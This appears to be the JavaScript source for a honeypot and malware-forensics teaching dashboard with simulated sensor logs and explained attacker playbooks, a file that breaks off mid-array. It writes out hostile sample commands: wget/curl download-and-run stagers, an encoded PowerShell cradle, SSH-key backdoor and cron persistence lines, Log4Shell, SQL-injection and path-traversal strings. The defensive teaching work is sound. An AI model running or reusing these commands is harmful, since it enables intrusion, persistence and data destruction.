/* ==========================================================================
   CYBER-GUARD // AUTONOMOUS HONEYPOT GRID & PAYLOAD FORENSICS LAB ENGINE
   Engineered for Hafiz Abdul Moiz & Muzmmial Ahmed CyberGuard SOC Portal
   ========================================================================== */

// AAPKE SCREENSHOT WALA EXACT FIREBASE REALTIME DATABASE URL:
const HP_FIREBASE_URL = "https://cyber-guard-live-feedback-default-rtdb.firebaseio.com/honeypot_leaks.json";
const HP_OWNER_WHATSAPP = "923262116352";

// Initial Verified Regional Indicators of Compromise (IoC) Leaks
const HP_SEED_LEAKS = [
    {
        id: "ioc-seed-1",
        type: "MALICIOUS IP",
        value: "185.220.101.5",
        target: "EasyPaisa / JazzCash Reverse Proxy",
        notes: "Hosting fake SMS verification portal redirecting to cred-stealer.",
        timestamp: Date.now() - 3600000,
        confirmedCount: 38,
        mitigated: false
    },
    {
        id: "ioc-seed-2",
        type: "SCAM SENDER ID",
        value: "EASY-PAY (Masked)",
        target: "Retail Mobile Wallets",
        notes: "Sending Rs. 25,000 accidental credit SMS lures requesting immediate refund.",
        timestamp: Date.now() - 7200000,
        confirmedCount: 54,
        mitigated: true
    },
    {
        id: "ioc-seed-3",
        type: "MALWARE SHA-256",
        value: "8f14e45fceea167a5a36dedd4bea2543b59f7df825b42d17464160a3ddb4ee2e",
        target: "BISP Relief Scheme APK",
        notes: "Android banking trojan requesting SMS permissions to intercept OTPs.",
        timestamp: Date.now() - 12000000,
        confirmedCount: 62,
        mitigated: false
    }
];

// Pre-Loaded Malware Samples for De-obfuscation Lab
const HP_MALWARE_SAMPLES = {
    powershell: {
        title: "Cobalt Strike PowerShell Dropper",
        raw: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABzACAAPQAgACQAQwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgAMAA4ADAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApADsASQBFAFgAIAAoACQAcwApAA==",
        mitre: "T1059.001 (Command and Scripting: PowerShell)",
        type: "Base64 Encoded PowerShell"
    },
    mirai: {
        title: "Mirai Botnet Telnet Stager",
        raw: "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *; wget http://185.220.101.5/bins/mirai.arm7; curl -O http://185.220.101.5/bins/mirai.arm7; chmod 777 mirai.arm7; ./mirai.arm7 telecom_probe",
        mitre: "T1105 (Ingress Tool Transfer)",
        type: "Linux Bash Dropper"
    },
    phish_eval: {
        title: "EasyPaisa Phish Script (JS Obfuscated)",
        raw: "eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%65%61%73%79%70%61%69%73%61%2D%63%61%73%68%62%6F%6E%75%73%2E%78%79%7A%2F%6C%6F%67%69%6E%2E%70%68%70%3F%61%63%63%6F%75%6E%74%3D%30%33%32%31%27'))",
        mitre: "T1027 (Obfuscated/Encoded Files)",
        type: "URI Encoded Eval"
    },
    xor_shellcode: {
        title: "XOR-Packed Shellcode Payload",
        raw: "\\x33\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80 (XOR Key: 0x5A)",
        mitre: "T1027.002 (Software Packing)",
        type: "XOR Byte Stream"
    }
};

// 4 Honeypot Sensors
const HP_HONEYPOT_SENSORS = {
    cowrie: {
        name: "Cowrie SSH / Telnet Decoy",
        port: "Port 22 & 23 (Open)",
        target: "Linux Terminal / Brute-force Collector",
        logs: [
            "[12:14:02] SSH Connection from 185.220.101.5:41203 -> Handshake OK",
            "[12:14:03] AUTH FAILURE: user 'root' password 'admin123'",
            "[12:14:04] AUTH FAILURE: user 'admin' password 'P@ssw0rd2026'",
            "[12:14:06] AUTH SUCCESS: user 'support' password 'support' (Honeypot Session Opened)",
            "[12:14:07] COMMAND CAPTURED: uname -a; cat /proc/cpuinfo",
            "[12:14:08] COMMAND CAPTURED: wget http://194.26.29.110/shell.sh -O /tmp/x; sh /tmp/x",
            "[12:14:09] 🚨 ALERT: Automated Dropper Execution Intercepted & Sandboxed!"
        ]
    },
    conpot: {
        name: "Conpot Industrial SCADA Decoy",
        port: "Port 502 (Modbus) & 102 (Siemens S7)",
        target: "Pakistani Energy Feeder / Substation PLC",
        logs: [
            "[12:08:11] Modbus TCP Connection from 103.21.244.18:50201",
            "[12:08:12] Modbus Function Code: 0x01 (Read Coils) -> Feeder-04 Register 0x00A0",
            "[12:08:14] Modbus Function Code: 0x05 (Write Single Coil) -> Attempting Breaker Trip",
            "[12:08:15] 🚨 SCADA ANOMALY: Unauthorized Remote Feeder Disconnect Command Neutralized!",
            "[12:08:16] Attacker fingerprint logged to APT-36 Recon Dossier."
        ]
    },
    dionaea: {
        name: "Dionaea Malware Binary Collector",
        port: "Port 445 (SMB) & 3389 (RDP)",
        target: "Windows Server Exploit Collector",
        logs: [
            "[11:55:01] SMB Connection from 45.142.214.8:49210",
            "[11:55:02] SMBv1 Protocol Negotiation -> MS17-010 (EternalBlue) exploit probe",
            "[11:55:04] Binary Payload Transferred (Size: 48,120 bytes)",
            "[11:55:05] Payload MD5: d41d8cd98f00b204e9800998ecf8427e",
            "[11:55:06] Sandbox Verdict: Ransomware Dropper targeting Volume Shadow Copies."
        ]
    },
    glastopf: {
        name: "Glastopf Web Vulnerability Decoy",
        port: "Port 80 & 443 (HTTP/HTTPS)",
        target: "Web Application SQLi / LFI Honeypot",
        logs: [
            "[11:42:10] HTTP GET /login.php?user=' UNION SELECT null,password,username FROM users--",
            "[11:42:11] HTTP GET /index.php?page=../../../../etc/passwd",
            "[11:42:13] HTTP POST /upload.php -> Malicious shell 'c99.php.jpg' uploaded",
            "[11:42:14] 🚨 WEB ATTACK CAPTURED: Payload quarantined in isolated chroot."
        ]
    }
};

let currentSensor = "cowrie";
let hpLeakList = [];
let isVoiceEnabled = true;
let isAudioFxEnabled = true;
let canvasAnimationId = null;
let radarBlips = [];
let radarAngle = 0;

// Audio & Speech Synthesizer
let audioCtx = null;
function getAudioCtx() {
    if (!audioCtx) {
        const AudioClass = window.AudioContext || window.webkitAudioContext;
        if (AudioClass) audioCtx = new AudioClass();
    }
    if (audioCtx && audioCtx.state === "suspended") audioCtx.resume();
    return audioCtx;
}

function playCyberChirp(frequency = 880, duration = 0.1) {
    if (!isAudioFxEnabled) return;
    try {
        const ctx = getAudioCtx();
        if (!ctx) return;
        const now = ctx.currentTime;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(frequency, now);
        osc.frequency.exponentialRampToValueAtTime(frequency * 1.5, now + duration);
        gain.gain.setValueAtTime(0.08, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + duration);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(now);
        osc.stop(now + duration);
    } catch {}
}

function speakTacticalVoice(text) {
    if (!isVoiceEnabled || !window.speechSynthesis) return;
    try {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(text);
        utterance.rate = 1.05;
        utterance.pitch = 0.95;
        utterance.volume = 0.9;
        window.speechSynthesis.speak(utterance);
    } catch {}
}

function toggleTacticalVoice() {
    isVoiceEnabled = !isVoiceEnabled;
    const btn = document.getElementById("hpVoiceBtn");
    if (btn) {
        btn.classList.toggle("active", isVoiceEnabled);
        btn.innerHTML = isVoiceEnabled ? "🗣️ AI Voice Alerts: ON" : "🔇 AI Voice Alerts: MUTED";
    }
    if (isVoiceEnabled) speakTacticalVoice("Tactical AI voice synthesis active.");
}

function toggleAudioFx() {
    isAudioFxEnabled = !isAudioFxEnabled;
    const btn = document.getElementById("hpAudioFxBtn");
    if (btn) {
        btn.classList.toggle("active", isAudioFxEnabled);
        btn.innerHTML = isAudioFxEnabled ? "🔊 Sound FX: ON" : "🔇 Sound FX: OFF";
    }
}

// HTML5 Canvas Radar Animation
function initCanvasRadar() {
    const canvas = document.getElementById("honeypotCanvas");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");

    function resizeCanvas() {
        const rect = canvas.parentElement.getBoundingClientRect();
        canvas.width = rect.width;
        canvas.height = rect.height;
    }
    resizeCanvas();
    window.addEventListener("resize", resizeCanvas);

    radarBlips = [
        { x: 0.35, y: 0.3, type: "attacker", color: "#ff0055", label: "185.220.101.5 (SSH Scan)", port: 22 },
        { x: 0.65, y: 0.45, type: "attacker", color: "#ffaa00", label: "103.21.244.18 (Modbus PLC)", port: 502 },
        { x: 0.45, y: 0.75, type: "attacker", color: "#00f0ff", label: "45.142.214.8 (SMB Probe)", port: 445 },
        { x: 0.5, y: 0.5, type: "decoy", color: "#00ffaa", label: "PK-CORE-DECOY-01", port: "ALL" },
        { x: 0.75, y: 0.25, type: "decoy", color: "#00ffaa", label: "KARACHI-HONEYPOT-02", port: 80 }
    ];

    function drawRadar() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        const cx = canvas.width / 2;
        const cy = canvas.height / 2;
        const radius = Math.min(cx, cy) - 20;

        ctx.strokeStyle = "rgba(0, 240, 255, 0.15)";
        ctx.lineWidth = 1;
        for (let r = 0.25; r <= 1; r += 0.25) {
            ctx.beginPath();
            ctx.arc(cx, cy, radius * r, 0, Math.PI * 2);
            ctx.stroke();
        }

        ctx.beginPath();
        ctx.moveTo(cx - radius, cy);
        ctx.lineTo(cx + radius, cy);
        ctx.moveTo(cx, cy - radius);
        ctx.lineTo(cx, cy + radius);
        ctx.stroke();

        radarAngle += 0.025;
        const sweepGradient = ctx.createRadialGradient(cx, cy, 0, cx, cy, radius);
        sweepGradient.addColorStop(0, "rgba(0, 240, 255, 0.25)");
        sweepGradient.addColorStop(1, "rgba(0, 240, 255, 0)");

        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, radius, radarAngle - 0.4, radarAngle);
        ctx.closePath();
        ctx.fillStyle = sweepGradient;
        ctx.fill();

        radarBlips.forEach(blip => {
            const bx = canvas.width * blip.x;
            const by = canvas.height * blip.y;

            ctx.beginPath();
            ctx.arc(bx, by, blip.type === "decoy" ? 6 : 5, 0, Math.PI * 2);
            ctx.fillStyle = blip.color;
            ctx.shadowColor = blip.color;
            ctx.shadowBlur = 10;
            ctx.fill();
            ctx.shadowBlur = 0;

            ctx.font = "9px 'Fira Code', monospace";
            ctx.fillStyle = "#cbd5e1";
            ctx.fillText(blip.label, bx + 8, by + 3);
        });

        canvasAnimationId = requestAnimationFrame(drawRadar);
    }

    drawRadar();

    canvas.addEventListener("click", (e) => {
        const rect = canvas.getBoundingClientRect();
        const mx = e.clientX - rect.left;
        const my = e.clientY - rect.top;

        radarBlips.forEach(blip => {
            const bx = canvas.width * blip.x;
            const by = canvas.height * blip.y;
            const dist = Math.hypot(mx - bx, my - by);

            if (dist < 18) {
                playCyberChirp(1200, 0.15);
                speakTacticalVoice(`Inspecting intercept node: ${blip.label}`);
                const statsEl = document.getElementById("canvasStatsOverlay");
                if (statsEl) {
                    statsEl.innerHTML = `TARGET ISOLATED: ${blip.label} // PORT ${blip.port} [ACTIVE TRAFFIC]`;
                }
            }
        });
    });
}

function deployDecoyTrap() {
    playCyberChirp(700, 0.2);
    const newDecoy = {
        x: 0.2 + Math.random() * 0.6,
        y: 0.2 + Math.random() * 0.6,
        type: "decoy",
        color: "#00ffaa",
        label: `DECOY-NODE-${Math.floor(10 + Math.random() * 90)}`,
        port: 22
    };
    radarBlips.push(newDecoy);
    speakTacticalVoice(`Autonomous honeypot decoy deployed to sector ${newDecoy.label}`);
    const statsEl = document.getElementById("canvasStatsOverlay");
    if (statsEl) {
        statsEl.innerHTML = `SENSOR DEPLOYED: ${newDecoy.label} ONLINE`;
    }
}

// Honeypot Sensor Switching
function switchHoneypotSensor(sensorKey) {
    currentSensor = sensorKey;
    playCyberChirp(950, 0.08);

    document.querySelectorAll(".hp-tab-btn").forEach(btn => {
        btn.classList.toggle("active", btn.getAttribute("data-sensor") === sensorKey);
    });

    const sensor = HP_HONEYPOT_SENSORS[sensorKey];
    if (!sensor) return;

    const nameEl = document.getElementById("hpDecoyName");
    const portEl = document.getElementById("hpDecoyPort");
    const logStream = document.getElementById("hpLogStream");

    if (nameEl) nameEl.textContent = sensor.name;
    if (portEl) portEl.textContent = `${sensor.port} // ${sensor.target}`;

    if (logStream) {
        logStream.innerHTML = sensor.logs.map(log => {
            const isRed = log.includes("ALERT") || log.includes("ANOMALY") || log.includes("FAILURE");
            return `<div class="hp-log-entry ${isRed ? 'flag-red' : ''}">${escapeHpHtml(log)}</div>`;
        }).join("");
    }
}

function isolateCurrentAttacker() {
    playCyberChirp(440, 0.3);
    speakTacticalVoice("Attacker IP severed. Firewall drop rule propagated across all sensors.");
    const logStream = document.getElementById("hpLogStream");
    if (logStream) {
        const timeStr = new Date().toLocaleTimeString();
        logStream.innerHTML += `
            <div class="hp-log-entry flag-red">
                [${timeStr}] ⚡ ISOLATION EXECUTED: iptables -A INPUT -s ATTACKER_IP -j DROP applied!
            </div>
        `;
        logStream.scrollTop = logStream.scrollHeight;
    }
}

// Payload Forensics & De-obfuscation
function selectMalwareSample(sampleKey) {
    playCyberChirp(800, 0.08);
    const sample = HP_MALWARE_SAMPLES[sampleKey];
    if (!sample) return;

    document.querySelectorAll(".hp-sample-chip").forEach(chip => {
        chip.classList.toggle("active", chip.getAttribute("data-sample") === sampleKey);
    });

    const input = document.getElementById("hpPayloadInput");
    if (input) input.value = sample.raw;

    const mitreEl = document.getElementById("hpMitreTtp");
    if (mitreEl) mitreEl.textContent = sample.mitre;
}

function calculateEntropy(str) {
    if (!str || str.length === 0) return 0;
    const len = str.length;
    const frequencies = {};
    for (let i = 0; i < len; i++) {
        const char = str[i];
        frequencies[char] = (frequencies[char] || 0) + 1;
    }

    let entropy = 0;
    for (const char in frequencies) {
        const p = frequencies[char] / len;
        entropy -= p * Math.log2(p);
    }
    return parseFloat(entropy.toFixed(3));
}

function runPayloadDeobfuscation() {
    const input = document.getElementById("hpPayloadInput")?.value || "";
    const outputBox = document.getElementById("hpOutputBox");
    const entropyValEl = document.getElementById("hpEntropyVal");
    const entropyFill = document.getElementById("hpEntropyFill");
    const deobfuscateSpeedEl = document.getElementById("hpSpeedVal");
    const iocCountEl = document.getElementById("hpIocCount");

    if (!input.trim()) return;

    playCyberChirp(1100, 0.15);
    const startTime = performance.now();

    const entropy = calculateEntropy(input);
    if (entropyValEl) entropyValEl.textContent = `${entropy} bits/byte`;
    if (entropyFill) {
        const pct = Math.min(100, (entropy / 8.0) * 100);
        entropyFill.style.width = pct + "%";
        entropyFill.style.backgroundColor = entropy > 6.0 ? "#ff0055" : (entropy > 4.5 ? "#ffaa00" : "#00ffaa");
    }

    let result = "";
    let extractedIocs = [];

    if (input.includes("-Enc ") || input.includes("-EncodedCommand ")) {
        const match = input.match(/-Enc\s+([A-Za-z0-9+/=]+)/i) || input.match(/-EncodedCommand\s+([A-Za-z0-9+/=]+)/i);
        if (match && match[1]) {
            try {
                const b64 = match[1];
                const rawBinary = atob(b64);
                let decodedStr = "";
                for (let i = 0; i < rawBinary.length; i += 2) {
                    decodedStr += rawBinary[i];
                }
                result = `[STAGE 1: POWERSHELL UTF-16LE DECODED]\n${decodedStr}\n\n`;
            } catch {
                result = "[ERROR: Invalid Base64 String]\n";
            }
        }
    }

    if (input.includes("%") || input.includes("unescape")) {
        try {
            const uriClean = input.replace(/eval\(unescape\('([^']+)'\)\)/i, "$1");
            const unescaped = decodeURIComponent(uriClean);
            result += `[STAGE 2: URL UNESCAPED STRING]\n${unescaped}\n\n`;
        } catch {}
    }

    if (input.includes("wget ") || input.includes("curl ")) {
        result += `[STAGE 3: BASH STAGER COMMANDS DETECTED]\nExtracted Remote Staging Chain: Download & Chmod 777 Execution\n\n`;
    }

    const ipMatches = input.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
    const urlMatches = input.match(/https?:\/\/[^\s'")]+/g) || [];

    ipMatches.forEach(ip => extractedIocs.push(`IP: ${ip}`));
    urlMatches.forEach(u => extractedIocs.push(`URL: ${u}`));

    const endTime = performance.now();
    if (deobfuscateSpeedEl) deobfuscateSpeedEl.textContent = `${(endTime - startTime).toFixed(1)} ms`;
    if (iocCountEl) iocCountEl.textContent = `${extractedIocs.length} IoCs Found`;

    result += `[STAGE 4: EXTRACTED INDICATORS OF COMPROMISE]\n` + (extractedIocs.length ? extractedIocs.join("\n") : "No public IPs directly detected in string.") + "\n\n";
    result += `[VERDICT: MALICIOUS THREAT SIGNATURE DETECTED]`;

    if (outputBox) outputBox.textContent = result;
    speakTacticalVoice(`De-obfuscation complete. Extracted ${extractedIocs.length} Indicators of Compromise. Entropy ${entropy}.`);
}

function openYaraRuleModal() {
    playCyberChirp(600, 0.15);
    const modal = document.getElementById("hpYaraModal");
    const codeEl = document.getElementById("hpYaraCode");
    if (!modal || !codeEl) return;

    const ruleCode = `rule CyberGuard_Honeypot_Payload_Intercept {
    meta:
        description = "Automated YARA rule generated by Hafiz Abdul Moiz & Muzmmial Ahmed SOC Engine"
        author = "CyberGuard SOC v6.0"
        date = "${new Date().toISOString().split('T')[0]}"
        severity = "CRITICAL"
        threat_level = "High"

    strings:
        $s1 = "powershell" ascii nocase
        $s2 = "wget" ascii nocase
        $s3 = "chmod 777" ascii nocase
        $s4 = "185.220.101.5" ascii
        $s5 = "eval" ascii nocase

    condition:
        2 of ($s*)
}`;

    codeEl.textContent = ruleCode;
    modal.style.display = "flex";
}

function closeYaraModal() {
    const modal = document.getElementById("hpYaraModal");
    if (modal) modal.style.display = "none";
}

function copyYaraRule() {
    const codeEl = document.getElementById("hpYaraCode");
    if (!codeEl) return;
    navigator.clipboard.writeText(codeEl.textContent).then(() => {
        alert("✅ YARA Rule copied to clipboard!");
    });
}

// Live Firebase Realtime DB Sync
async function fetchHoneypotLeaks() {
    try {
        const res = await fetch(HP_FIREBASE_URL, { cache: "no-store" });
        if (res.ok) {
            const data = await res.json();
            if (data && typeof data === "object") {
                const remote = Object.keys(data).map(key => ({ id: key, ...data[key] }));
                const map = new Map();
                HP_SEED_LEAKS.forEach(s => map.set(s.id, s));
                remote.forEach(r => map.set(r.id, r));
                hpLeakList = Array.from(map.values()).sort((a, b) => b.timestamp - a.timestamp);
                renderHoneypotLeaks();
                return;
            }
        }
    } catch {
        // Graceful fallback to the seeded threat vault when Firebase is unavailable.
    }

    if (hpLeakList.length === 0) hpLeakList = [...HP_SEED_LEAKS];
    renderHoneypotLeaks();
}

function renderHoneypotLeaks() {
    const grid = document.getElementById("hpLeakCardsGrid");
    if (!grid) return;

    grid.innerHTML = hpLeakList.map(leak => {
        const timeAgo = formatHpTime(leak.timestamp);
        const waText = encodeURIComponent(
            `🚨 *CYBERGUARD IoC THREAT ALERT*\n\n` +
            `⚠️ *Type:* ${leak.type}\n` +
            `🎯 *Threat Value:* ${leak.value}\n` +
            `🏢 *Targeted Sector:* ${leak.target}\n` +
            `📝 *Forensic Note:* ${leak.notes}\n\n` +
            `🛡️ *Confirmed by Community:* ${leak.confirmedCount} times\n` +
            `🌐 *Status:* Active on Firebase Realtime DB`
        );

        return `
            <div class="hp-leak-item">
                <div>
                    <div class="hp-leak-top">
                        <span class="hp-ioc-type">${escapeHpHtml(leak.type)}</span>
                        <span class="hp-leak-time">${timeAgo}</span>
                    </div>
                    <div class="hp-leak-val">${escapeHpHtml(leak.value)}</div>
                    <div class="hp-leak-meta">
                        <strong>Target:</strong> ${escapeHpHtml(leak.target)}<br>
                        <strong>Forensic Note:</strong> ${escapeHpHtml(leak.notes)}
                    </div>
                </div>
                <div class="hp-leak-actions">
                    <button type="button" class="btn-confirm-threat" onclick="confirmThreatLeak('${leak.id}')">
                        👍 Confirm Threat (${leak.confirmedCount || 0})
                    </button>
                    <a href="https://wa.me/${HP_OWNER_WHATSAPP}?text=${waText}" target="_blank" class="btn-wa-alert">
                        📲 Forward WA
                    </a>
                </div>
            </div>
        `;
    }).join("");
}

async function handleIocSubmit(e) {
    e.preventDefault();
    const typeSelect = document.getElementById("hpIocType");
    const valInput = document.getElementById("hpIocVal");
    const targetInput = document.getElementById("hpIocTarget");
    const notesInput = document.getElementById("hpIocNotes");

    if (!valInput.value.trim() || !notesInput.value.trim()) return;

    const newLeak = {
        type: typeSelect.value || "MALICIOUS IP",
        value: valInput.value.trim(),
        target: targetInput.value.trim() || "Banking / Mobile Wallets",
        notes: notesInput.value.trim(),
        timestamp: Date.now(),
        confirmedCount: 1,
        mitigated: false
    };

    playCyberChirp(550, 0.2);

    try {
        const res = await fetch(HP_FIREBASE_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(newLeak)
        });
        if (res.ok) {
            const data = await res.json();
            newLeak.id = data.name || "ioc_" + Date.now();
        } else {
            newLeak.id = "ioc_" + Date.now();
        }
    } catch {
        newLeak.id = "ioc_" + Date.now();
    }

    hpLeakList.unshift(newLeak);
    renderHoneypotLeaks();

    valInput.value = "";
    targetInput.value = "";
    notesInput.value = "";

    speakTacticalVoice("New Indicator of Compromise broadcasted to Firebase Realtime Database.");

    const waText = encodeURIComponent(
        `🚨 *NEW IoC SUBMISSION DISPATCH*\n\n` +
        `⚠️ *Type:* ${newLeak.type}\n` +
        `🎯 *Value:* ${newLeak.value}\n` +
        `🏢 *Target:* ${newLeak.target}\n` +
        `📝 *Note:* ${newLeak.notes}\n\n` +
        `🛡️ Dispatched to Hafiz Abdul Moiz & Muzmmial Ahmed SOC Portal.`
    );
    window.open(`https://wa.me/${HP_OWNER_WHATSAPP}?text=${waText}`, "_blank");
}

async function confirmThreatLeak(id) {
    const item = hpLeakList.find(i => i.id === id);
    if (!item) return;

    item.confirmedCount = (item.confirmedCount || 0) + 1;
    playCyberChirp(850, 0.08);
    renderHoneypotLeaks();

    try {
        await fetch(`https://cyber-guard-live-feedback-default-rtdb.firebaseio.com/honeypot_leaks/${id}/confirmedCount.json`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(item.confirmedCount)
        });
    } catch {}
}

function formatHpTime(timestamp) {
    if (!timestamp) return "Live";
    const mins = Math.floor((Date.now() - timestamp) / 60000);
    if (mins < 1) return "Just Now";
    if (mins < 60) return `${mins}m ago`;
    const hrs = Math.floor(mins / 60);
    return `${hrs}h ago`;
}

function escapeHpHtml(str) {
    return String(str || "").replace(/[&<>'"]/g, c => ({
        "&": "&amp;", "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;"
    }[c]));
}

// Auto Initialize
document.addEventListener("DOMContentLoaded", () => {
    initCanvasRadar();
    switchHoneypotSensor("cowrie");
    selectMalwareSample("powershell");
    fetchHoneypotLeaks();
    setInterval(fetchHoneypotLeaks, 12000);
});

/* ============================================================================
   v6  -  HONEYPOT COMMAND CENTER  (extension)
   SIM  : attacker sessions, credentials, commands (documentation IPs only)
   REAL : "Enrich any IP" uses ipwho.is + Shodan InternetDB + RDAP (public data)
   ============================================================================ */
(function () {
"use strict";
const mount = document.getElementById("hp6Root");
if (!mount) return;
const $ = (s, r = mount) => r.querySelector(s);
const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a), ri = (a, b) => Math.floor(rnd(a, b + 1)), pick = a => a[Math.floor(Math.random() * a.length)];
const tier = () => document.documentElement.dataset.perf || "medium";
const flag = cc => (cc && cc.length === 2) ? String.fromCodePoint(...[...cc.toUpperCase()].map(c => 127397 + c.charCodeAt(0))) : "🌎";
const hex = n => Array.from({ length: n }, () => "0123456789abcdef"[ri(0, 15)]).join("");
const num = n => Number(n).toLocaleString("en-US");

const COUNTRIES = [["CN", "China", 14], ["RU", "Russia", 11], ["US", "United States", 11], ["BR", "Brazil", 8], ["IN", "India", 7], ["VN", "Vietnam", 7], ["NL", "Netherlands", 5], ["DE", "Germany", 4], ["KR", "South Korea", 5], ["ID", "Indonesia", 5], ["TW", "Taiwan", 4], ["UA", "Ukraine", 4], ["TR", "Turkey", 3], ["PK", "Pakistan", 3], ["IR", "Iran", 3], ["EG", "Egypt", 2]];
const pickCountry = () => { let t = COUNTRIES.reduce((a, c) => a + c[2], 0) * Math.random(); for (const c of COUNTRIES) { t -= c[2]; if (t <= 0) return c; } return COUNTRIES[0]; };
const USERS = ["root", "admin", "ubnt", "pi", "user", "oracle", "postgres", "test", "guest", "support", "git", "ftpuser", "ubuntu", "default", "tomcat", "jenkins"];
const PASSW = ["123456", "admin", "root", "password", "raspberry", "12345", "ubnt", "1234", "test", "default", "admin123", "toor", "P@ssw0rd", "qwerty", "changeme", "letmein", "12345678", "1q2w3e4r"];
const TOOLS = ["Hydra", "Medusa", "masscan + custom script", "Mirai scanner", "zgrab2", "python-paramiko bot", "libssh scanner", "Shodan-like crawler", "unknown botnet"];
const SENSORS = [["Cowrie SSH", "ssh", 22, "SSH/Telnet shell emulator"], ["Cowrie Telnet", "telnet", 23, "SSH/Telnet shell emulator"], ["Dionaea SMB", "smb", 445, "malware-capturing SMB trap"], ["Web trap", "http", 80, "fake web admin panels"], ["Conpot ICS", "modbus", 502, "industrial (SCADA) controller"], ["MQTT broker trap", "mqtt", 1883, "fake IoT broker"], ["RDP trap", "rdp", 3389, "fake Windows remote desktop"], ["MySQL trap", "mysql", 3306, "fake database"]];
const MITRE = { T1595: ["Reconnaissance", "Active Scanning"], T1190: ["Initial Access", "Exploit Public-Facing App"], T1078: ["Initial Access", "Valid Accounts"], T1110: ["Credential Access", "Brute Force"], T1059: ["Execution", "Command & Scripting"], T1053: ["Persistence", "Scheduled Task / Cron"], T1098: ["Persistence", "Account Manipulation (SSH keys)"], T1070: ["Defense Evasion", "Indicator Removal"], T1082: ["Discovery", "System Information"], T1083: ["Discovery", "File & Directory"], T1046: ["Discovery", "Network Service Discovery"], T1105: ["Command & Control", "Ingress Tool Transfer"], T1496: ["Impact", "Resource Hijacking"], T0855: ["Impact (ICS)", "Unauthorized Command Message"] };
const TACTICS = ["Reconnaissance", "Initial Access", "Execution", "Persistence", "Defense Evasion", "Credential Access", "Discovery", "Command & Control", "Impact", "Impact (ICS)"];
const PLAYBOOKS = [
    { name: "Mirai-style IoT bot loader", sensors: ["ssh", "telnet"], steps: [["enable", "Probes for a router/IoT command line. Mirai-family botnets try this first.", "T1059"], ["cat /proc/cpuinfo | grep name | wc -l", "Counts CPU cores. Bots profile the device to pick the right payload.", "T1082"], ["uname -a", "Learns the CPU architecture so it can download a matching binary.", "T1082"], ["cd /tmp || cd /var/run; wget http://{MAL}/bins/arm7 -O .x; chmod +x .x; ./.x", "Downloads and runs the bot from a writable folder. This is the infection step.", "T1105"], ["rm -rf ~/.bash_history", "Deletes command history to hide what happened.", "T1070"]], kill: 4, tags: ["botnet", "IoT"] },
    { name: "Crypto-miner dropper", sensors: ["ssh"], steps: [["nproc && free -m", "Checks CPU and RAM. Miners want powerful, unmonitored servers.", "T1082"], ["curl -s http://{MAL}/m.sh | sh", "Pipes a remote script straight into the shell: classic one-line malware install.", "T1105"], ["(crontab -l; echo '*/5 * * * * /tmp/.m') | crontab -", "Adds a cron job so the miner restarts every 5 minutes (persistence).", "T1053"], ["pkill -f xmrig; pkill -f minerd", "Kills competing miners to keep all CPU for itself.", "T1496"]], kill: 5, tags: ["cryptojacking"] },
    { name: "SSH key persistence", sensors: ["ssh"], steps: [["id; whoami", "Confirms which account and privileges it landed on.", "T1082"], ["mkdir -p ~/.ssh && chmod 700 ~/.ssh", "Prepares the SSH folder for a backdoor key.", "T1098"], ["echo 'ssh-rsa AAAAB3Nza...{KEY} attacker@box' >> ~/.ssh/authorized_keys", "Installs the attacker's public key: permanent access even if the password changes.", "T1098"], ["chattr +i ~/.ssh/authorized_keys", "Makes the file immutable so admins cannot easily remove the key.", "T1070"]], kill: 5, tags: ["persistence"] },
    { name: "Recon-only sweep", sensors: ["ssh", "telnet"], steps: [["uname -a", "Operating system fingerprint.", "T1082"], ["cat /etc/passwd", "Lists local accounts to target.", "T1083"], ["ps aux", "Looks for security tools and other users' processes.", "T1082"], ["netstat -tulpn", "Maps listening services and internal network position.", "T1046"], ["exit", "Leaves quietly. Often a scouting bot reporting back to a larger operation.", "T1059"]], kill: 3, tags: ["recon"] },
    { name: "SMB worm probe (EternalBlue-style)", sensors: ["smb"], steps: [["SMB negotiate: NT LM 0.12", "Checks which SMB dialect the host speaks.", "T1595"], ["Trans2 request (oversized)", "Sends a malformed packet that vulnerable unpatched Windows hosts mishandle.", "T1190"], ["Shellcode stage 1 (egg)", "Attempted payload delivery. Dionaea captures the binary for analysis.", "T1105"]], kill: 3, tags: ["worm", "ransomware vector"] },
    { name: "Web exploit (Log4Shell-style)", sensors: ["http"], steps: [["GET /?x=${jndi:ldap://{MAL}/a}", "Injects a log-lookup string. Vulnerable Java apps fetch and run attacker code.", "T1190"], ["POST /login.php  user=admin' OR '1'='1", "Classic SQL-injection login bypass attempt.", "T1190"], ["GET /../../../../etc/passwd", "Path traversal to read system files.", "T1083"]], kill: 2, tags: ["web", "CVE exploit"] },
